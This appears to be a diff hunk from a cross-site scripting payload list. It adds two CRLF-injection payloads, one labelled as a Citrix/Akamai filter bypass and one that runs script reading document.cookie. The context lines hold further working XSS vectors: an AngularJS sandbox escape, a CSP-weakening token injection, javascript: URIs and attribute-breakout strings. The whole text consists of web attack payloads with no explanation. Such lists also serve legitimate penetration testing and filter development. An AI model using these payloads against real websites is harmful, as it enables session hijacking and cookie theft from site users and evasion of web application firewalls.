@@ -15,6 +15,8 @@ javascript://--></title></style></textarea></script><svg "//' onclick=alert()///
 %3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E 
 1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
 %3Cscript%3Ealert%281%29%3C%2Fscript%3E&token=;script-src-elem%20%27unsafe-inline%27
+%0D%0A%0D%0A%3Cbody+x=%27&%27onload=%22(alert)(%27citrix+akamai+bypass%27)%22%3E
+%0d%0a%0d%0a%3Cscript%3Ealert(document.cookie)%3C/script%3E
 javascript:alert(0)//https://google.com
 test%2Aconsole.log(1337)//’;
 h0tak88r’accesskey=’x’onclick=’alert(0)’
